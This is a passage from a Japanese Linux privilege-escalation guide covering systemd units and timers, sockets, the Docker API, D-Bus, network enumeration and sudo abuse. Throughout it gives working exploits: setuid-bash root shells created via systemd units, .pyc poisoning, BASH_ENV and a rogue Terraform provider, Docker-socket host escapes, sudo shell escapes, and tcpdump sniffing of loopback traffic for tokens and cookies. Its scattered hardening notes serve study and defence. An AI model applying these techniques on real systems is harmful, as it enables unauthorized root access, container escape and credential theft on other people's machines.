サービスによって実行されるバイナリへの**書き込み権限**がある場合は、それらをbackdoorに置き換えることができます。そうすると、サービスが再実行されたときにbackdoorが実行されます。

### systemd PATH - 相対パス

**systemd** が使用するPATHは、次のコマンドで確認できます:

```bash
systemctl show-environment
```

パス内のいずれかのフォルダに**書き込み**できる場合、**権限昇格**が可能なことがあります。次のようなサービス設定ファイルで使用されている**相対パス**を探す必要があります。

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

次に、書き込み可能な systemd PATH フォルダー内に、相対パスのバイナリと同じ名前の**実行可能ファイル**を作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**backdoorが実行されます**（通常、非特権ユーザーはサービスを起動／停止できませんが、`sudo -l`を使えるか確認してください）。

**サービスについて詳しくは、`man systemd.service`を参照してください。**

## **Timers**

**Timers**は、名前が`**.timer**`で終わるsystemdユニットファイルで、`**.service**`ファイルまたはイベントを制御します。**Timers**は、カレンダー時刻イベントと単調時刻イベントを標準でサポートし、非同期に実行できるため、cronの代替として使用できます。

すべてのタイマーは、次のコマンドで列挙できます:

```bash
systemctl list-timers --all
```

### 書き込み可能な timers

timer を変更できる場合、systemd.unit の既存ユニット（`.service` や `.target` など）を実行させることができます。

```bash
Unit=backdoor.service
```

ドキュメントでは、Unit について次のように説明されています。

> タイマーの時間が経過したときに起動する unit。引数には、サフィックスが「.timer」ではない unit 名を指定します。指定しない場合、デフォルトではタイマー unit と同じ名前（サフィックスを除く）の service が使用されます。（上記参照。）起動する unit 名とタイマー unit 名は、サフィックスを除いて同じ名前にすることが推奨されています。

したがって、この権限を悪用するには、次のことが必要です。

- **書き込み可能なバイナリを実行している** systemd unit（`.service` など）を見つける
- **相対パスを実行している** systemd unit を見つけ、**systemd PATH** に対する**書き込み権限**を持っている（その実行ファイルになりすますため）

**`man systemd.timer` でタイマーについて詳しく確認してください。**

### **タイマーの有効化**

タイマーを有効にするには、root 権限で次のコマンドを実行します。

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Note: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます。

## ソケット

Unix Domain Sockets（UDS）は、クライアントサーバーモデルにおいて、同一または異なるマシン上の**プロセス間通信**を可能にします。コンピューター間通信には標準的な Unix ディスクリプタファイルを使用し、`.socket` ファイルで設定します。<sup>[[14]](#references)</sup>

ソケットは `.socket` ファイルを使って設定できます。

**`man systemd.socket` でソケットについて詳しく学べます。** このファイルでは、以下のような興味深いパラメーターを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：これらのオプションはそれぞれ異なりますが、ソケットが**どこで待ち受けるかを示す**設定です（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 アドレスやポート番号など）。
- `Accept`：真偽値を指定します。**true** の場合、**接続ごとにサービスインスタンスが起動**し、そのインスタンスには接続ソケットのみが渡されます。**false** の場合、すべての待ち受けソケット自体が**起動したサービスユニットに渡され**、すべての接続に対してサービスユニットが 1 つだけ起動します。データグラムソケットと FIFO では、サービスユニット 1 つが無条件にすべての受信トラフィックを処理するため、この値は無視されます。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`、`ExecStartPost`：1 つ以上のコマンドラインを指定します。これらは、待ち受け**ソケット**／FIFO が作成されてバインドされる**前**または**後**に実行されます。コマンドラインの最初のトークンには絶対ファイル名を指定し、その後にプロセスの引数を続けます。
- `ExecStopPre`、`ExecStopPost`：待ち受け**ソケット**／FIFO が閉じられて削除される**前**または**後**に実行される追加の**コマンド**です。
- `Service`：**受信トラフィック**で**有効化する**サービスユニット名を指定します。この設定は `Accept=no` のソケットでのみ使用できます。デフォルトでは、ソケットと同じ名前のサービス（サフィックスは置き換えられます）が設定されます。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

**書き込み可能な** `.socket` ファイルが見つかった場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような設定を**追加**できます。すると、ソケットが作成される前に backdoor が実行されます。そのため、**おそらくマシンが再起動されるまで待つ必要があります。**\
_システムがそのソケットファイルの設定を使用していなければ、backdoor は実行されないことに注意してください_

### Socket activation + 書き込み可能な unit パス（存在しないサービスの作成）

影響の大きい別の設定ミスは、次のとおりです。

- `Accept=no` で `Service=<name>.service` が指定された socket unit
- 参照先のサービスユニットが存在しない
- 攻撃者が `/etc/systemd/system`（または別の unit 検索パス）に書き込める

この場合、攻撃者は `<name>.service` を作成し、ソケットにトラフィックを送信して systemd に新しいサービスを読み込ませ、root として実行できます。

大まかな流れ：

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 書き込み可能なソケット

**書き込み可能なソケットを特定した場合**（ここでは Unix ソケットを指しており、設定用の `.socket` ファイルではありません）、そのソケットと**通信でき**、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙

```bash
netstat -a -p --unix
```

### 生の接続

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**悪用例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTPソケット

HTTPリクエストを待ち受けている**ソケット**がある場合があります（`.socket`ファイルのことではなく、unixソケットとして機能するファイルのことです）。次のコマンドで確認できます:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

ソケットが**HTTP**リクエストに応答する場合、そのソケットと**通信**でき、脆弱性を**exploit**できる可能性があります。

### Writable Docker Socket

Docker socket（多くの場合 `/var/run/docker.sock`）は、保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権があると、権限昇格につながる可能性があります。以下では、その方法と Docker CLI が利用できない場合の代替手段について説明します。

#### **Docker CLI による権限昇格**

Docker socket への書き込みアクセス権がある場合、次のコマンドを使用して権限を昇格できます。<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

これらのコマンドを使うと、ホストのファイルシステムに root 権限でアクセスできるコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、Unix socket経由のraw HTTPを使ってDocker socketを悪用できます。最も確実な手順は次のとおりです。

- ホストのrootをbind mountした、長時間実行するhelper containerを作成する
- そのコンテナを起動する
- そのhelper内で`exec`インスタンスを作成する
- `exec`インスタンスを起動し、API経由で出力を読み取る

**Dockerイメージを一覧表示する**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**ヘルパーコンテナを作成して起動する**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**exec instanceを作成する**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**execインスタンスを起動して出力を読み取る**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

このパターンは通常、`socat` や `nc -U` で `attach` を手動で実行しようとするよりも堅牢です。`/:/host` を使ってヘルパーを作成できれば、追加の `exec` インスタンスを使って `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、ホストの起動ファイルを変更したりできます。

### その他

**`docker` グループ内にいる**ために docker socket への書き込み権限がある場合、[**権限昇格の方法は他にもあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**docker API がポートでリッスンしている**場合は、それを侵害できる可能性もあります](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**コンテナから脱出する方法や、コンテナランタイムを悪用して権限昇格する方法**について、さらに確認してください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) の権限昇格

**`ctr`** コマンドを使用できる場合は、以下のページを確認してください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

**`runc`** コマンドを使用できる場合は、以下のページを確認してください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な**プロセス間通信（IPC）システム**で、アプリケーションが効率的に相互作用し、データを共有できるようにします。現代の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション通信に対応する堅牢なフレームワークを提供します。<sup>[[16]](#references)</sup>

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートします。これは、**拡張された UNIX domain socket**を想起させるものです。また、イベントやシグナルのブロードキャストにも対応し、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth daemon から着信を知らせるシグナルを受け取った music player がミュートになり、ユーザー体験を向上させることができます。さらに、D-Bus はリモートオブジェクトシステムにも対応しており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は**許可／拒否モデル**で動作し、一致するポリシールールの累積的な効果に基づいて、メッセージの権限（メソッド呼び出し、シグナルの送信など）を管理します。これらのポリシーは bus とのやり取りを指定し、その権限を悪用することで権限昇格につながる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーの例を以下に示します。このポリシーでは、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、そこへメッセージを送信し、そこからメッセージを受信するための権限を定義しています。

ユーザーまたはグループが指定されていないポリシーは全体に適用されます。一方、「default」コンテキストのポリシーは、他の特定のポリシーで対象になっていないすべてに適用されます。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus communication の enumerate と exploit の方法はこちら:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

マシンの位置を把握するために、ネットワークを列挙するのは常に興味深いことです。

### 一般的な列挙

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

有効な `/etc/inetd.conf` エントリが GNU Inetutils `telnetd` を root として実行している場合、ポートが loopback のみにバインドされていても、設定されたバイナリのバージョンとローカルリスナーを確認してください。GNU Inetutils 1.9.3 から 2.7 には、クライアントが指定した `USER` が `login -f` に渡される[telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89)がありました（CVE-2026-24061）。プロセスやバージョン文字列は兆候にすぎません。公開状態と判断する前に、ベンダーのパッチ適用状況と実際のデーモンを確認してください。詳しくは[Telnet ガイド](../../../network-services-pentesting/pentesting-telnet.md)を参照してください。

### Outbound filtering の簡易トリアージ

ホスト上でコマンドを実行できるものの callback が失敗する場合は、DNS、transport、proxy、route のフィルタリングをすばやく切り分けます:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 開いているポート

アクセスする前に、これまで操作できなかったマシン上で動作しているネットワークサービスを必ず確認してください。

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

リスナーをバインド先で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカルからのみアクセス可能です（トンネルやポートフォワーディングの候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみアクセスできます。

### ローカル限定サービスのトリアージ手順

ホストを侵害すると、`127.0.0.1` にバインドされたサービスに、初めてシェルからアクセスできることがよくあります。手早く調べるには、次の手順を実行します。

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### ネットワークスキャナーとしてのLinPEAS（ネットワーク専用モード）

ローカルのPEチェックに加えて、linPEASはネットワークスキャナーに特化したモードで実行できます。`$PATH` 内で利用可能なバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールしません。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` を指定せずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋なネットワークスキャナーとして動作します（残りの権限昇格チェックはスキップされます）。

### Sniffing

トラフィックを sniff できるか確認してください。可能であれば、認証情報を取得できるかもしれません。

```
timeout 1 tcpdump
```

すぐにできる実践的なチェック:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback（`lo`）は post-exploitation で特に価値があります。多くの内部専用サービスがそこで tokens/cookies/credentials を公開しているためです：

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

今キャプチャし、後で解析する：

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## ユーザー

### 一般的な Enumeration

自分が**誰**で、どのような**権限**を持っているか、システム内にどのような**ユーザー**がいるか、誰が**login**できるか、誰が**root 権限**を持っているかを確認します:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### 大きなUID

一部のLinuxバージョンには、**UID > INT_MAX** のユーザーが権限昇格できるバグがありました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**次の方法で悪用できます**: **`systemd-run -t /bin/bash`**

### グループ

root権限を得られる可能性のある**グループに所属しているか**確認してください:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### クリップボード

クリップボード内に興味深い情報がないか確認してください（可能な場合）。

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### パスワードポリシー

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 既知のパスワード

環境内の**パスワードを知っている**場合は、そのパスワードを使って**各ユーザーとしてログイン**してみてください。

### Su Brute

大量のノイズが発生しても構わず、コンピューター上に `su` と `timeout` のバイナリがある場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーへの brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーへの brute-force を試みます。

## 書き込み可能な PATH の悪用

### $PATH

**$PATH 内のいずれかのフォルダーに書き込める**場合、書き込み可能なフォルダー内に、別のユーザー（理想的には root）が実行するコマンドと同じ名前の**backdoor を作成**することで、権限昇格できる可能性があります。ただし、そのコマンドが $PATH 内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれないことが条件です。

### SUDO と SUID

sudo を使ってコマンドを実行できる場合や、コマンドに suid ビットが設定されている場合があります。以下を使って確認してください：

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一部の**意外なコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行までできる場合があります**。<sup>[[8]](#references)</sup> 例えば：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo の設定によっては、パスワードを知らなくても、ユーザーが別のユーザーの権限で特定のコマンドを実行できる場合があります。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

この例では、ユーザー `demo` は `root` として `vim` を実行できます。root ディレクトリに ssh key を追加するか、`sh` を呼び出せば、簡単に shell を取得できます。

```
sudo vim -c '!sh'
```

### sudo スクリプト内のクォートされていない Bash 比較

Bash では、`[[ "$protected" == $candidate ]]` の右辺はパターンとして扱われます。root 権限で実行可能な sudo スクリプトが、呼び出し元が制御できるファイルから `candidate` を設定する場合、`prefix*` のような値が保護対象文字列の先頭部分に一致することがあります。成功時とエラー時で処理経路が異なると、prefix oracle が露呈する可能性があります。リテラルな等価性を意図している場合は、右辺をクォートしてください（`[[ "$protected" == "$candidate" ]]`）。クォートされていない比較を悪用可能と判断する前に、実際の sudo 引数、入力元、外部から観察できる分岐動作を確認してください。[GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) では、このパターンの動作が定義されています。

### sudo 経由の PrusaSlicer プロジェクトファイル

`prusaslicer` または `prusa-slicer` に対する制限のない root 権限で実行可能な sudo 許可は、呼び出し元がスライス対象の `.3mf` プロジェクトを選べる場合、調査が必要です。プロジェクトには、G-code のエクスポート時に実行される後処理スクリプトを含められます。細工されたプロジェクトは、2.6.1 までの PrusaSlicer 内でコマンドを実行できる可能性があります（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。権限境界に到達できると結論づける前に、有効な sudo ルール、バイナリのバージョンとベンダーのパッチ、プロジェクトの入手元、該当するエクスポート処理が実行されるかを確認してください。固定されたプロジェクト引数や、有効な `NOEXEC` ポリシーによって結果が変わることがあります。スライサーがインストールされていることだけでは、権限昇格経路が存在する証拠にはなりません。

### SETENV

このディレクティブを使うと、ユーザーは何かを実行する際に**環境変数を設定**できます：

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

この例は、**HTB machine Admirer**を**基にしており**、rootとしてスクリプトを実行する際に任意のPythonライブラリを読み込む**PYTHONPATH hijacking**に対して**脆弱**でした。

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo で実行可能な Python の import における書き込み可能な `__pycache__` / `.pyc` の汚染

**sudo で実行可能な Python スクリプト**が、パッケージディレクトリに**書き込み可能な `__pycache__`**を含むモジュールを import する場合、キャッシュされた `.pyc` を置き換えて、次回の import 時に特権ユーザーとしてコードを実行できる可能性があります。<sup>[[30]](#references)</sup>

- 動作する理由:
  - CPython はバイトコードキャッシュを `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
  - インタープリターは**ヘッダー**（magic + ソースに紐づくタイムスタンプ／ハッシュのメタデータ）を検証し、その後、ヘッダーに続くマーシャリング済みコードオブジェクトを実行します。
  - ディレクトリが書き込み可能で、キャッシュファイルを**削除して再作成**できる場合、root 所有で書き込み不可の `.pyc` でも置き換えられます。
- 典型的なパス:
  - `sudo -l` に、root として実行できる Python スクリプトまたはラッパーが表示される。
  - そのスクリプトが `/opt/app/`、`/usr/local/lib/...` などからローカルモジュールを import する。
  - import されるモジュールの `__pycache__` ディレクトリが、自分のユーザーまたは全ユーザーに対して書き込み可能である。

簡単な列挙:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

特権スクリプトを調査できる場合は、インポートされたモジュールとそのキャッシュパスを特定します。<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

悪用手順:

1. sudoで許可されたスクリプトを一度実行し、Pythonに正規のキャッシュファイルを作成させます（まだ存在しない場合）。
2. 正規の `.pyc` から先頭16バイトを読み取り、汚染したファイルで再利用します。
3. payloadのコードオブジェクトをコンパイルし、`marshal.dumps(...)` でシリアライズします。元のキャッシュファイルを削除し、元のヘッダーと悪意のあるバイトコードを結合して再作成します。
4. sudoで許可されたスクリプトを再実行し、import時にrootとしてpayloadを実行させます。

重要な注意点:

- 元のヘッダーを再利用することが重要です。Pythonはキャッシュのメタデータをソースファイルと照合しますが、バイトコード本体が実際にソースと一致するかどうかは確認しません。
- これは、ソースファイルがroot所有で書き込み不可でも、格納先の `__pycache__` ディレクトリが書き込み可能な場合に特に有効です。
- `PYTHONDONTWRITEBYTECODE=1` と `python -B` は、Pythonによる新しい `.pyc` ファイルの書き込みを防ぎますが、すでに存在する、有効な攻撃者置換済みキャッシュの読み込みまでは防ぎません。重要なのは、低い権限のユーザーが、特権付きimportで受け入れられるキャッシュを置換できるかどうかです。Pythonはキャッシュされたバイトコードを読み込む前に、タイムスタンプ/サイズまたはハッシュのメタデータを確認します。[Pythonのimportリファレンス](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation)と[コマンドラインのドキュメント](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE)を参照してください。

最小限の概念実証の形式:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

ハードニング:

- 特権 Python の import path にあるディレクトリが、`__pycache__` を含め、低権限ユーザーによって書き込み可能になっていないことを確認します。
- 既存の `.pyc` ファイルも含め、キャッシュディレクトリの所有者と権限を監査します。バイトコードの書き込みを無効にすれば、新たなキャッシュの作成を減らせますが、置き換え可能な既存のキャッシュは無害化されません。
- 書き込み可能なローカル Python モジュールやキャッシュディレクトリは、root が実行する書き込み可能なシェルスクリプトや共有ライブラリと同様に扱います。

### sudo env_keep で保持された BASH_ENV → root シェル

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、Bash の非対話型起動時の動作を利用して、許可されたコマンドの実行時に root として任意のコードを実行できます。<sup>[[24]](#references)</sup>

- 動作する理由: 非対話型シェルの場合、Bash は対象スクリプトを実行する前に `$BASH_ENV` を評価し、そのファイルを source します。多くの sudo ルールでは、スクリプトやシェルラッパーの実行が許可されています。`BASH_ENV` が sudo によって保持されると、指定したファイルは root 権限で source されます。<sup>[[23]](#references)</sup>

- 要件:
  - 実行可能な sudo ルール（非対話型で `/bin/bash` を呼び出す対象、または任意の bash スクリプト）。
  - `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
  - sudo で許可されたコマンドにシェルラッパーを使わず、最小限のバイナリを使用する。
  - 保持された環境変数が使われた場合に備えて、sudo の I/O logging とアラートを検討する。

### sudo と保持された HOME を介した Terraform（!env_reset）

sudo でより高い権限を持つユーザーとして Terraform を実行できる場合、`!env_reset` は、そのルールで実際にどの環境変数が保持されるかを確認する手掛かりになります。呼び出し元が書き込み可能な `.terraformrc` または `terraform.rc` を有効な CLI 設定として扱う前に、実効的な `HOME` または `TF_CLI_CONFIG_FILE` を確認してください。`provider_installation.dev_overrides` エントリが意味を持つのは、指定された Terraform コマンドがそのプロバイダーを読み込み、かつ呼び出し元が選択されたディレクトリに実行ファイルを配置できる場合に限られます。<sup>[[25]](#references)</sup>

- 必要なプロバイダーを書き込み可能なディレクトリに向け、そのプロバイダー名の悪意あるプラグイン（例：`terraform-provider-examples`）を配置する：

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

